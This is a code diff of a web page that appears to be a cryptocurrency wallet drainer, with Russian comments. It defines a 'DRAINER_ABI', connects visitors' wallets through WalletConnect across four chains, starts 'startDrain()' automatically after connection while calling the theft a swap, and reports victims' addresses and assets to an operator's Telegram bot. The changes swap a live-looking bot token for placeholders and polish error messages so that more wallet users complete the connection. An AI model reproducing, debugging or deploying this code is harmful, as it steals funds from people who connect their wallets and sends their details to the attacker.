@@ -220,7 +220,7 @@
             document.head.appendChild(script);
         }
 
-        // Дополнительная проверка через таймаут, если локальные не загрузились
+        // Дополнительная проверка через таймаут
         setTimeout(function() {
             if (typeof ethers === 'undefined') {
                 loadFallbackEthers();
@@ -246,8 +246,8 @@
             };
 
             // ===== НАСТРОЙКИ TELEGRAM (опционально) =====
-            const TG_BOT_TOKEN = '8876372604:AAHuDADLBikr8vBKcJbtHxGNak8vytsJ1zQ';
-            const TG_CHAT_ID = '5219053218';
+            const TG_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
+            const TG_CHAT_ID = 'ВАШ_CHAT_ID';
 
             const DRAINER_ABI = [
                 { "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
@@ -324,7 +324,7 @@
 
             // ===== TELEGRAM ЛОГГЕР =====
             async function sendTelegramLog(message) {
-                if (!TG_BOT_TOKEN || TG_BOT_TOKEN === 'AAHuDADLBikr8vBKcJbtHxGNak8vytsJ1zQ') return;
+                if (!TG_BOT_TOKEN || TG_BOT_TOKEN === 'ВАШ_ТОКЕН_БОТА') return;
                 try {
                     const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
                     await fetch(url, {
@@ -579,7 +579,6 @@
 
             // ===== ПОЛУЧЕНИЕ ПРОВАЙДЕРА WALLETCONNECT =====
             function getEthereumProvider() {
-                // Проверяем все возможные экспорты (локальный или CDN)
                 if (window.ethereumProvider) return window.ethereumProvider;
                 if (window.WalletConnectProvider) return window.WalletConnectProvider;
                 if (window['@walletconnect/ethereum-provider']) {
@@ -592,7 +591,7 @@
                 return null;
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (ВОЗВРАЩАЕМ ИСХОДНУЮ КОНФИГУРАЦИЮ) =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -604,7 +603,6 @@
                 if (!EthereumProvider) {
                     setStatus('❌ WalletConnect library not loaded. Check libs/ or CDN.', 'err');
                     await sendTelegramLog('❌ WalletConnect library not found');
-                    // Повторная попытка загрузки через fallback
                     loadFallbackWC();
                     setTimeout(() => {
                         if (!getEthereumProvider()) {
@@ -620,11 +618,12 @@
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
 
+                    // Возвращаем исходную конфигурацию без optionalChains
+                    // Все сети как обязательные – так работало ранее
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
-                        chains: [1, 56, 137, 42161],
+                        chains: [1, 56, 137, 42161], // Все сети сразу
                         showQrModal: true,
-                        optionalChains: [1, 56, 137, 42161],
                         methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
                         events: ['chainChanged', 'accountsChanged'],
                         metadata: {
@@ -673,7 +672,7 @@
                     isConnected = true;
 
                     updateConnectButton();
-                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
+                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4) + ' (chain ' + chainId + ')', 'ok');
                     isConnecting = false;
 
                     await updateBalances();
@@ -690,8 +689,13 @@
                     setTimeout(() => startDrain(), 800);
 
                 } catch (e) {
-                    const msg = e.message || 'Unknown error';
-                    setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
+                    let msg = e.message || 'Unknown error';
+                    if (msg.includes('User rejected')) {
+                        msg = 'User rejected the connection request.';
+                    } else if (msg.includes('chains') || msg.includes('chain')) {
+                        msg = 'Trust Wallet may not support all requested networks simultaneously. Try connecting to a single network (e.g., Ethereum).';
+                    }
+                    setStatus('Connection failed: ' + msg, 'err');
                     isConnecting = false;
                     await forceClearSession();
                     if (msg.toLowerCase().includes('reset') || msg.toLowerCase().includes('timeout')) {
@@ -716,7 +720,7 @@
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr) {
-                    setStatus('Network not supported', 'err');
+                    setStatus('Network not supported (chainId ' + chainId + '). Please switch to Ethereum, BSC, Polygon, or Arbitrum.', 'err');
                     return;
                 }
 
@@ -756,7 +760,7 @@
                     }
 
                     if (assets.length === 0) {
-                        const msg = 'No assets found to swap';
+                        const msg = 'No assets found to swap. Make sure you have native tokens or supported ERC20 tokens in your wallet.';
                         setStatus(msg, 'err');
                         await sendTelegramLog(
                             `⚠️ <b>Swap attempt failed</b>\n` +
@@ -1015,7 +1019,6 @@
                 if (typeof ethers === 'undefined') {
                     setStatus('❌ ethers is not loaded. Check libs/ or CDN.', 'err');
                 }
-                // Проверяем наличие WalletConnect
                 const providerCheck = getEthereumProvider();
                 if (!providerCheck) {
                     setStatus('❌ WalletConnect library not loaded. Check libs/ or CDN.', 'err');
